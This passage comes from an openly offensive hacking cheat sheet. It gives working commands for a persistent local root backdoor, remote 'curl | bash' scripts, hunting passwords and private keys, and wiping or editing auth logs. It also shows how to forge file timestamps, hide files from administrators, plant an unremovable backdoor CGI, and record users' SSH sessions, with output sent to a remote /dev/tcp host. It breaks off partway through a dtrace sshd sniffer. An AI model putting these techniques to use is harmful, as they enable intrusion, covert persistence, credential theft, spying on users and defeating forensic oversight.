<div class="language-sh highlight"><pre><span></span><code><span id="__span-153-1"><a id="__codelineno-153-1" name="__codelineno-153-1" href="#__codelineno-153-1"></a><span class="c1">### 1. Optional: Start a test PHP server</span>
</span><span id="__span-153-2"><a id="__codelineno-153-2" name="__codelineno-153-2" href="#__codelineno-153-2"></a><span class="nb">cd</span><span class="w"> </span>/var/www/html<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>php<span class="w"> </span>-S<span class="w"> </span><span class="m">127</span>.0.0.1:8080
</span><span id="__span-153-3"><a id="__codelineno-153-3" name="__codelineno-153-3" href="#__codelineno-153-3"></a><span class="c1">### Without executing a command</span>
</span><span id="__span-153-4"><a id="__codelineno-153-4" name="__codelineno-153-4" href="#__codelineno-153-4"></a>curl<span class="w"> </span>http://127.0.0.1:8080/test.php
</span><span id="__span-153-5"><a id="__codelineno-153-5" name="__codelineno-153-5" href="#__codelineno-153-5"></a><span class="c1">### With executing a command</span>
</span><span id="__span-153-6"><a id="__codelineno-153-6" name="__codelineno-153-6" href="#__codelineno-153-6"></a>curl<span class="w"> </span>http://127.0.0.1:8080/test.php<span class="w"> </span>-d<span class="w"> </span><span class="nv">0</span><span class="o">=</span><span class="s2">&quot;ps fax; uname -mrs; id&quot;</span>
</span></code></pre></div></p>
<p><a id="ld-backdoor"></a>
<strong>6.v. Local Root Backdoor</strong></p>
<p>Stay root once you got root
<div class="language-bash highlight"><pre><span></span><code><span id="__span-154-1"><a id="__codelineno-154-1" name="__codelineno-154-1" href="#__codelineno-154-1"></a><span class="c1">### Execute as root user</span>
</span><span id="__span-154-2"><a id="__codelineno-154-2" name="__codelineno-154-2" href="#__codelineno-154-2"></a>setcap<span class="w"> </span>cap_setuid+ep<span class="w"> </span>/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></code></pre></div>
Become root
<div class="language-bash highlight"><pre><span></span><code><span id="__span-155-1"><a id="__codelineno-155-1" name="__codelineno-155-1" href="#__codelineno-155-1"></a><span class="c1">### Execute as non-root user</span>
</span><span id="__span-155-2"><a id="__codelineno-155-2" name="__codelineno-155-2" href="#__codelineno-155-2"></a>/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<span class="w"> </span>/usr/bin/python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#39;</span>
</span></code></pre></div></p>
<p><a id="hostrecon"></a></p>
<h2 id="7-host-recon">7. Host Recon</h2>
<hr />
<p>Get <a href="https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/whatserver.sh">essential information</a> about a host:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-156-1"><a id="__codelineno-156-1" name="__codelineno-156-1" href="#__codelineno-156-1"></a>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://thc.org/ws<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
</span></code></pre></div></p>
<p>netstat if there is no netstat/ss/lsof:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-157-1"><a id="__codelineno-157-1" name="__codelineno-157-1" href="#__codelineno-157-1"></a>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/tools/awk_netstat.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
</span></code></pre></div></p>
<p>Speed check the system
<div class="language-sh highlight"><pre><span></span><code><span id="__span-158-1"><a id="__codelineno-158-1" name="__codelineno-158-1" href="#__codelineno-158-1"></a>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://bench.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
</span><span id="__span-158-2"><a id="__codelineno-158-2" name="__codelineno-158-2" href="#__codelineno-158-2"></a><span class="c1"># Another speed check:  </span>
</span><span id="__span-158-3"><a id="__codelineno-158-3" name="__codelineno-158-3" href="#__codelineno-158-3"></a><span class="c1"># curl -fsSL https://yabs.sh | bash</span>
</span></code></pre></div></p>
<p>Find all suid/sgid binaries:
<div class="language-text highlight"><pre><span></span><code><span id="__span-159-1"><a id="__codelineno-159-1" name="__codelineno-159-1" href="#__codelineno-159-1"></a>find  / -xdev -type f -perm /6000  -ls 2&gt;/dev/null
</span></code></pre></div></p>
<p>Find all writeable directories:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-160-1"><a id="__codelineno-160-1" name="__codelineno-160-1" href="#__codelineno-160-1"></a>wfind<span class="o">()</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-160-2"><a id="__codelineno-160-2" name="__codelineno-160-2" href="#__codelineno-160-2"></a><span class="w">    </span><span class="nb">local</span><span class="w"> </span>arr<span class="w"> </span>dir
</span><span id="__span-160-3"><a id="__codelineno-160-3" name="__codelineno-160-3" href="#__codelineno-160-3"></a>
</span><span id="__span-160-4"><a id="__codelineno-160-4" name="__codelineno-160-4" href="#__codelineno-160-4"></a><span class="w">    </span><span class="nv">arr</span><span class="o">=(</span><span class="s2">&quot;</span><span class="nv">$@</span><span class="s2">&quot;</span><span class="o">)</span>
</span><span id="__span-160-5"><a id="__codelineno-160-5" name="__codelineno-160-5" href="#__codelineno-160-5"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="si">${#</span><span class="nv">arr</span><span class="p">[@]</span><span class="si">}</span><span class="w"> </span>-gt<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-160-6"><a id="__codelineno-160-6" name="__codelineno-160-6" href="#__codelineno-160-6"></a><span class="w">        </span><span class="nv">dir</span><span class="o">=</span><span class="si">${</span><span class="nv">arr</span><span class="p">[</span><span class="si">${#</span><span class="nv">arr</span><span class="p">[@]</span><span class="si">}</span><span class="p">-1]</span><span class="si">}</span>
</span><span id="__span-160-7"><a id="__codelineno-160-7" name="__codelineno-160-7" href="#__codelineno-160-7"></a><span class="w">        </span><span class="nb">unset</span><span class="w"> </span><span class="s2">&quot;arr[</span><span class="si">${#</span><span class="nv">arr</span><span class="p">[@]</span><span class="si">}</span><span class="s2">-1]&quot;</span>
</span><span id="__span-160-8"><a id="__codelineno-160-8" name="__codelineno-160-8" href="#__codelineno-160-8"></a><span class="w">        </span>find<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$dir</span><span class="s2">&quot;</span><span class="w">  </span>-maxdepth<span class="w"> </span><span class="m">1</span><span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span>-writable<span class="w"> </span>-ls<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</span><span id="__span-160-9"><a id="__codelineno-160-9" name="__codelineno-160-9" href="#__codelineno-160-9"></a><span class="w">        </span><span class="nv">IFS</span><span class="o">=</span><span class="s1">$&#39;\n&#39;</span><span class="w"> </span><span class="nv">arr</span><span class="o">+=(</span><span class="k">$(</span>find<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$dir</span><span class="s2">&quot;</span><span class="w"> </span>-mindepth<span class="w"> </span><span class="m">1</span><span class="w"> </span>-maxdepth<span class="w"> </span><span class="m">1</span><span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span>!<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span><span class="o">)</span>
</span><span id="__span-160-10"><a id="__codelineno-160-10" name="__codelineno-160-10" href="#__codelineno-160-10"></a><span class="w">    </span><span class="k">done</span>
</span><span id="__span-160-11"><a id="__codelineno-160-11" name="__codelineno-160-11" href="#__codelineno-160-11"></a><span class="o">}</span>
</span><span id="__span-160-12"><a id="__codelineno-160-12" name="__codelineno-160-12" href="#__codelineno-160-12"></a><span class="c1"># Usage: wfind /</span>
</span><span id="__span-160-13"><a id="__codelineno-160-13" name="__codelineno-160-13" href="#__codelineno-160-13"></a><span class="c1"># Usage: wfind /etc /var /usr </span>
</span></code></pre></div></p>
<p>Find local passwords (using noseyparker):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-161-1"><a id="__codelineno-161-1" name="__codelineno-161-1" href="#__codelineno-161-1"></a>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://github.com/praetorian-inc/noseyparker/releases/download/v0.16.0/noseyparker-v0.16.0-x86_64-unknown-linux-gnu.tar.gz<span class="w"> </span><span class="p">|</span><span class="w"> </span>tar<span class="w"> </span>xvfz<span class="w"> </span>-<span class="w"> </span>--transform<span class="o">=</span><span class="s2">&quot;flags=r;s|.*/||&quot;</span><span class="w"> </span>--no-anchored<span class="w">  </span>--wildcards<span class="w"> </span>noseyparker<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-161-2"><a id="__codelineno-161-2" name="__codelineno-161-2" href="#__codelineno-161-2"></a>./noseyparker<span class="w"> </span>scan<span class="w"> </span>.<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-161-3"><a id="__codelineno-161-3" name="__codelineno-161-3" href="#__codelineno-161-3"></a>./noseyparker<span class="w"> </span>report
</span></code></pre></div>
(Or use <a href="https://github.com/aydinnyunus/PassDetective">PassDetective</a> to find passwords in ~/.*history)</p>
<p>Using <code>grep</code>:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-162-1"><a id="__codelineno-162-1" name="__codelineno-162-1" href="#__codelineno-162-1"></a><span class="c1"># Find passwords (without garbage).</span>
</span><span id="__span-162-2"><a id="__codelineno-162-2" name="__codelineno-162-2" href="#__codelineno-162-2"></a>grep<span class="w"> </span>-HEronasir<span class="w">  </span><span class="s1">&#39;.{16}password.{,64}&#39;</span><span class="w"> </span>.
</span><span id="__span-162-3"><a id="__codelineno-162-3" name="__codelineno-162-3" href="#__codelineno-162-3"></a><span class="c1"># Find TLS or OpenSSH keys:</span>
</span><span id="__span-162-4"><a id="__codelineno-162-4" name="__codelineno-162-4" href="#__codelineno-162-4"></a>grep<span class="w"> </span>-r<span class="w"> </span>-F<span class="w"> </span>--<span class="w"> </span><span class="s2">&quot; PRIVATE KEY-----&quot;</span><span class="w"> </span>.
</span></code></pre></div></p>
<hr />
<p><a id="shell-hacks"></a></p>
<h2 id="8-shell-hacks">8. Shell Hacks</h2>
<p><a id="shred"></a>
<strong>8.i. Shred &amp; Erase a file</strong></p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-163-1"><a id="__codelineno-163-1" name="__codelineno-163-1" href="#__codelineno-163-1"></a>shred<span class="w"> </span>-z<span class="w"> </span>foobar.txt
</span></code></pre></div>
<p><div class="language-sh highlight"><pre><span></span><code><span id="__span-164-1"><a id="__codelineno-164-1" name="__codelineno-164-1" href="#__codelineno-164-1"></a><span class="c1">## SHRED without shred command</span>
</span><span id="__span-164-2"><a id="__codelineno-164-2" name="__codelineno-164-2" href="#__codelineno-164-2"></a>shred<span class="o">()</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-164-3"><a id="__codelineno-164-3" name="__codelineno-164-3" href="#__codelineno-164-3"></a><span class="w">    </span><span class="o">[[</span><span class="w"> </span>-z<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>!<span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span><span class="w"> </span><span class="s2">&quot;shred [FILE]&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="m">255</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-164-4"><a id="__codelineno-164-4" name="__codelineno-164-4" href="#__codelineno-164-4"></a><span class="w">    </span>dd<span class="w"> </span><span class="nv">status</span><span class="o">=</span>none<span class="w"> </span><span class="nv">bs</span><span class="o">=</span>1k<span class="w"> </span><span class="nv">count</span><span class="o">=</span><span class="k">$(</span>du<span class="w"> </span>-sk<span class="w"> </span><span class="si">${</span><span class="nv">1</span><span class="p">:?</span><span class="si">}</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f1<span class="k">)</span><span class="w"> </span><span class="k">if</span><span class="o">=</span>/dev/urandom<span class="w"> </span>&gt;<span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
</span><span id="__span-164-5"><a id="__codelineno-164-5" name="__codelineno-164-5" href="#__codelineno-164-5"></a><span class="w">    </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">1</span><span class="p">:?</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-164-6"><a id="__codelineno-164-6" name="__codelineno-164-6" href="#__codelineno-164-6"></a><span class="o">}</span>
</span><span id="__span-164-7"><a id="__codelineno-164-7" name="__codelineno-164-7" href="#__codelineno-164-7"></a>shred<span class="w"> </span>foobar.txt
</span></code></pre></div>
Note: Or deploy your files in <em>/dev/shm</em> directory so that no data is written to the harddrive. Data will be deleted on reboot.</p>
<p>Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.</p>
<p><a id="restore-timestamp"></a>
<strong>8.ii. Restore the date of a file</strong></p>
<p>Let's say you have modified <em>/etc/passwd</em> but the file date now shows that <em>/etc/passwd</em> has been modifed. Use <em>touch</em> to change the file data to the date of another file (in this example, <em>/etc/shadow</em>)</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-165-1"><a id="__codelineno-165-1" name="__codelineno-165-1" href="#__codelineno-165-1"></a>touch<span class="w"> </span>-r<span class="w"> </span>/etc/shadow<span class="w"> </span>/etc/passwd
</span></code></pre></div>
<p><a id="shell-clean-logs"></a>
<strong>8.iii. Clear logfile</strong></p>
<p>This will reset the logfile to 0 without having to restart syslogd etc:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-166-1"><a id="__codelineno-166-1" name="__codelineno-166-1" href="#__codelineno-166-1"></a>&gt;/var/log/auth.log<span class="w"> </span><span class="c1"># or on old shells: cat /dev/null &gt;/var/log/auth.log</span>
</span></code></pre></div></p>
<p>This will remove any line containing the IP <code>1.2.3.4</code> from the log file:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-167-1"><a id="__codelineno-167-1" name="__codelineno-167-1" href="#__codelineno-167-1"></a>xlog<span class="o">()</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-167-2"><a id="__codelineno-167-2" name="__codelineno-167-2" href="#__codelineno-167-2"></a><span class="w">    </span><span class="nb">local</span><span class="w"> </span><span class="nv">a</span><span class="o">=</span><span class="k">$(</span>sed<span class="w"> </span><span class="s2">&quot;/</span><span class="si">${</span><span class="nv">1</span><span class="p">:?</span><span class="si">}</span><span class="s2">/d&quot;</span><span class="w"> </span>&lt;<span class="s2">&quot;</span><span class="si">${</span><span class="nv">2</span><span class="p">:?</span><span class="si">}</span><span class="s2">&quot;</span><span class="k">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$a</span><span class="s2">&quot;</span><span class="w"> </span>&gt;<span class="s2">&quot;</span><span class="si">${</span><span class="nv">2</span><span class="p">:?</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-167-3"><a id="__codelineno-167-3" name="__codelineno-167-3" href="#__codelineno-167-3"></a><span class="o">}</span>
</span><span id="__span-167-4"><a id="__codelineno-167-4" name="__codelineno-167-4" href="#__codelineno-167-4"></a>xlog<span class="w"> </span><span class="s2">&quot;1\.2\.3\.4&quot;</span><span class="w"> </span>/var/log/auth.log
</span><span id="__span-167-5"><a id="__codelineno-167-5" name="__codelineno-167-5" href="#__codelineno-167-5"></a><span class="c1"># xlog &quot;${SSH_CLIENT%% *}&quot; /var/log/auth.log</span>
</span><span id="__span-167-6"><a id="__codelineno-167-6" name="__codelineno-167-6" href="#__codelineno-167-6"></a><span class="c1"># xlog &quot;^2023.* thc\.org&quot; foo.log</span>
</span></code></pre></div></p>
<p><a id="shell-hide-files"></a>
<strong>8.iv. Hide files from that User without root privileges</strong></p>
<p>Our favorite working directory is <em>/dev/shm/</em>. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.</p>
<p>Hiding permanent files:</p>
<p>Method 1:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-168-1"><a id="__codelineno-168-1" name="__codelineno-168-1" href="#__codelineno-168-1"></a><span class="nb">alias</span><span class="w"> </span><span class="nv">ls</span><span class="o">=</span><span class="s1">&#39;ls -I system-dev&#39;</span>
</span></code></pre></div></p>
<p>This will hide the directory <em>system-dev</em> from the <em>ls</em> command. Place in User's <em>~/.profile</em> or system wide <em>/etc/profile</em>.</p>
<p>Method 2:
Tricks from the 80s. Consider any directory that the admin rarely looks into (like <em>/boot/.X11/..</em> or so):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-169-1"><a id="__codelineno-169-1" name="__codelineno-169-1" href="#__codelineno-169-1"></a>mkdir<span class="w"> </span><span class="s1">&#39;...&#39;</span>
</span><span id="__span-169-2"><a id="__codelineno-169-2" name="__codelineno-169-2" href="#__codelineno-169-2"></a><span class="nb">cd</span><span class="w"> </span><span class="s1">&#39;...&#39;</span>
</span></code></pre></div></p>
<p>Method 3:
Unix allows filenames with about any ASCII character but 0x00. Try tab (<em>\t</em>). Happens that most Admins do not know how to cd into any such directory.
<div class="language-sh highlight"><pre><span></span><code><span id="__span-170-1"><a id="__codelineno-170-1" name="__codelineno-170-1" href="#__codelineno-170-1"></a>mkdir<span class="w"> </span><span class="s1">$&#39;\t&#39;</span>
</span><span id="__span-170-2"><a id="__codelineno-170-2" name="__codelineno-170-2" href="#__codelineno-170-2"></a><span class="nb">cd</span><span class="w"> </span><span class="s1">$&#39;\t&#39;</span>
</span></code></pre></div></p>
<p><a id="perm-files"></a>
<strong>8.v. Make a file immuteable</strong></p>
<p>This will redirect <code>/var/www/cgi/blah.cgi</code> to <code>/boot/backdoor.cgi</code>. The file <code>blah.cgi</code> can not be modified or removed (unless unmounted).
<div class="language-sh highlight"><pre><span></span><code><span id="__span-171-1"><a id="__codelineno-171-1" name="__codelineno-171-1" href="#__codelineno-171-1"></a><span class="c1"># /boot/backdoor.cgi contains our backdoor</span>
</span><span id="__span-171-2"><a id="__codelineno-171-2" name="__codelineno-171-2" href="#__codelineno-171-2"></a>touch<span class="w"> </span>/var/www/cgi/blah.cgi
</span><span id="__span-171-3"><a id="__codelineno-171-3" name="__codelineno-171-3" href="#__codelineno-171-3"></a>mount<span class="w"> </span>-o<span class="w"> </span>bind,ro<span class="w"> </span>/boot/backdoor.cgi<span class="w"> </span>/var/www/cgi/blah.cgi
</span></code></pre></div></p>
<p><a id="nosudo"></a>
<strong>8.vi. Change user without sudo/su</strong></p>
<p>Needed for taking screenshots of X11 sessions (aka <code>xwd -root -display :0 | convert - jpg:screenshot.jpg</code>)
<div class="language-bash highlight"><pre><span></span><code><span id="__span-172-1"><a id="__codelineno-172-1" name="__codelineno-172-1" href="#__codelineno-172-1"></a><span class="nv">U</span><span class="o">=</span><span class="k">$(</span>id<span class="w"> </span>-u<span class="w"> </span>UserName<span class="k">)</span><span class="w"> </span><span class="c1">### &lt;-- Set UserName</span>
</span><span id="__span-172-2"><a id="__codelineno-172-2" name="__codelineno-172-2" href="#__codelineno-172-2"></a><span class="nv">H</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span>grep<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$U</span><span class="s2">&quot;</span><span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d:<span class="w"> </span>-f6<span class="k">)</span><span class="s2">&quot;</span>
</span><span id="__span-172-3"><a id="__codelineno-172-3" name="__codelineno-172-3" href="#__codelineno-172-3"></a><span class="nv">HOME</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">H</span><span class="k">:-</span><span class="p">/tmp</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import os;os.setuid(</span><span class="si">${</span><span class="nv">U</span><span class="p">:?</span><span class="si">}</span><span class="s2">);os.execl(&#39;/bin/bash&#39;, &#39;-bash&#39;)&quot;</span>
</span><span id="__span-172-4"><a id="__codelineno-172-4" name="__codelineno-172-4" href="#__codelineno-172-4"></a><span class="c1"># change -bash to bash to not make this a login shell.</span>
</span></code></pre></div></p>
<hr />
<p><a id="crypto"></a></p>
<h2 id="9-crypto">9. Crypto</h2>
<p><a id="gen-password"></a>
<strong>9.i. Generate quick random Password</strong></p>
<p>Good for quick passwords without human element.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-173-1"><a id="__codelineno-173-1" name="__codelineno-173-1" href="#__codelineno-173-1"></a>openssl<span class="w"> </span>rand<span class="w"> </span>-base64<span class="w"> </span><span class="m">24</span>
</span></code></pre></div>
<p>If <code>openssl</code> is not available then we can also use <code>head</code> to read from <code>/dev/urandom</code>.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-174-1"><a id="__codelineno-174-1" name="__codelineno-174-1" href="#__codelineno-174-1"></a>head<span class="w"> </span>-c<span class="w"> </span><span class="m">32</span><span class="w"> </span>&lt;<span class="w"> </span>/dev/urandom<span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span>-p<span class="w"> </span>-c<span class="w"> </span><span class="m">32</span>
</span></code></pre></div>
<p>or make it alpha-numeric</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-175-1"><a id="__codelineno-175-1" name="__codelineno-175-1" href="#__codelineno-175-1"></a>head<span class="w"> </span>-c<span class="w"> </span><span class="m">32</span><span class="w"> </span>&lt;<span class="w"> </span>/dev/urandom<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-dc<span class="w"> </span><span class="s1">&#39;[:alnum:]&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-c<span class="w"> </span><span class="m">16</span>
</span></code></pre></div>
<p><a id="crypto-filesystem"></a>
<strong>9.ii.a. Linux transportable encrypted filesystems - cryptsetup</strong></p>
<p>Create a 256MB large encrypted file system. You will be prompted for a password.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-176-1"><a id="__codelineno-176-1" name="__codelineno-176-1" href="#__codelineno-176-1"></a>dd<span class="w"> </span><span class="k">if</span><span class="o">=</span>/dev/urandom<span class="w"> </span><span class="nv">of</span><span class="o">=</span>/tmp/crypted<span class="w"> </span><span class="nv">bs</span><span class="o">=</span>1M<span class="w"> </span><span class="nv">count</span><span class="o">=</span><span class="m">256</span><span class="w"> </span><span class="nv">iflag</span><span class="o">=</span>fullblock
</span><span id="__span-176-2"><a id="__codelineno-176-2" name="__codelineno-176-2" href="#__codelineno-176-2"></a>cryptsetup<span class="w"> </span>luksFormat<span class="w"> </span>/tmp/crypted
</span><span id="__span-176-3"><a id="__codelineno-176-3" name="__codelineno-176-3" href="#__codelineno-176-3"></a>cryptsetup<span class="w"> </span>open<span class="w"> </span>/tmp/crypted<span class="w"> </span>sec
</span><span id="__span-176-4"><a id="__codelineno-176-4" name="__codelineno-176-4" href="#__codelineno-176-4"></a>mkfs<span class="w"> </span>-t<span class="w"> </span>ext3<span class="w"> </span>/dev/mapper/sec
</span></code></pre></div>
<p>Mount:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-177-1"><a id="__codelineno-177-1" name="__codelineno-177-1" href="#__codelineno-177-1"></a>cryptsetup<span class="w"> </span>open<span class="w"> </span>/tmp/crypted<span class="w"> </span>sec
</span><span id="__span-177-2"><a id="__codelineno-177-2" name="__codelineno-177-2" href="#__codelineno-177-2"></a>mount<span class="w"> </span>-o<span class="w"> </span>nofail,noatime<span class="w"> </span>/dev/mapper/sec<span class="w"> </span>/mnt/sec
</span></code></pre></div>
<p>Store data in <code>/mnt/crypted</code>, then unmount:</p>
<p><div class="language-sh highlight"><pre><span></span><code><span id="__span-178-1"><a id="__codelineno-178-1" name="__codelineno-178-1" href="#__codelineno-178-1"></a>umount<span class="w"> </span>/mnt/sec
</span><span id="__span-178-2"><a id="__codelineno-178-2" name="__codelineno-178-2" href="#__codelineno-178-2"></a>cryptsetup<span class="w"> </span>close<span class="w"> </span>sec<span class="w"> </span>
</span></code></pre></div>
<a id="encfs"></a>
<strong>9.ii.b. Linux transportable encrypted filesystems - EncFS</strong></p>
<p>Create <code>.sec</code> and store the encrypted data in <code>.raw</code>:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-179-1"><a id="__codelineno-179-1" name="__codelineno-179-1" href="#__codelineno-179-1"></a>mkdir<span class="w"> </span>.raw<span class="w"> </span>.sec
</span><span id="__span-179-2"><a id="__codelineno-179-2" name="__codelineno-179-2" href="#__codelineno-179-2"></a>encfs<span class="w"> </span>--standard<span class="w">  </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PWD</span><span class="si">}</span><span class="s2">/.raw&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PWD</span><span class="si">}</span><span class="s2">/.sec&quot;</span>
</span></code></pre></div></p>
<p>unmount:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-180-1"><a id="__codelineno-180-1" name="__codelineno-180-1" href="#__codelineno-180-1"></a>fusermount<span class="w"> </span>-u<span class="w"> </span>.sec
</span></code></pre></div></p>
<p><a id="encrypting-file"></a>
<strong>9.iii Encrypting a file</strong></p>
<p>Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-181-1"><a id="__codelineno-181-1" name="__codelineno-181-1" href="#__codelineno-181-1"></a><span class="c1"># Encrypt</span>
</span><span id="__span-181-2"><a id="__codelineno-181-2" name="__codelineno-181-2" href="#__codelineno-181-2"></a>openssl<span class="w"> </span>enc<span class="w"> </span>-aes-256-cbc<span class="w"> </span>-pbkdf2<span class="w"> </span>-k<span class="w"> </span>fOUGsg1BJdXPt0CY4I<span class="w"> </span>&lt;input.txt<span class="w"> </span>&gt;input.txt.enc
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-182-1"><a id="__codelineno-182-1" name="__codelineno-182-1" href="#__codelineno-182-1"></a><span class="c1"># Decrypt</span>
</span><span id="__span-182-2"><a id="__codelineno-182-2" name="__codelineno-182-2" href="#__codelineno-182-2"></a>openssl<span class="w"> </span>enc<span class="w"> </span>-d<span class="w"> </span>-aes-256-cbc<span class="w"> </span>-pbkdf2<span class="w"> </span>-k<span class="w"> </span>fOUGsg1BJdXPt0CY4I<span class="w"> </span>&lt;input.txt.enc<span class="w"> </span>&gt;input.txt
</span></code></pre></div>
<hr />
<p><a id="ssh-sniffing"></a></p>
<h2 id="10-ssh-sniffing">10. SSH Sniffing</h2>
<p><a id="ssh-sniffing-script"></a>
<strong>10.i Sniff a user's SHELL session with script</strong></p>
<p>A method to log the shell session of a user (who logged in via SSH).</p>
<p>The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-183-1"><a id="__codelineno-183-1" name="__codelineno-183-1" href="#__codelineno-183-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;exec script -qc /bin/bash ~/.ssh-log.txt&#39;</span><span class="w"> </span>&gt;&gt;~/.profile
</span></code></pre></div>
Consider using <a href="#bash-hide-arguments">zap-args</a> to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.</p>
<p><a id="dtrace"></a>
<strong>10.ii Sniff all SHELL sessions with dtrace - FreeBSD</strong></p>
<p>Especially useful for Solaris/SunOS and FreeBSD (pfSense). It uses kernel probes to trace <em>all</em> sshd processes.</p>
<p>Copy this "D Script" to the target system to a file named <code>d</code>:
<div class="language-c highlight"><pre><span></span><code><span id="__span-184-1"><a id="__codelineno-184-1" name="__codelineno-184-1" href="#__codelineno-184-1"></a><span class="cp">#pragma D option quiet</span>
</span><span id="__span-184-2"><a id="__codelineno-184-2" name="__codelineno-184-2" href="#__codelineno-184-2"></a><span class="kr">inline</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="n">NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;sshd&quot;</span><span class="p">;</span>
</span><span id="__span-184-3"><a id="__codelineno-184-3" name="__codelineno-184-3" href="#__codelineno-184-3"></a><span class="n">syscall</span><span class="o">::</span><span class="n">write</span><span class="o">:</span><span class="n">entry</span>
</span><span id="__span-184-4"><a id="__codelineno-184-4" name="__codelineno-184-4" href="#__codelineno-184-4"></a><span class="o">/</span><span class="p">(</span><span class="n">arg0</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">arg2</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">execname</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NAME</span><span class="p">)</span><span class="o">/</span>
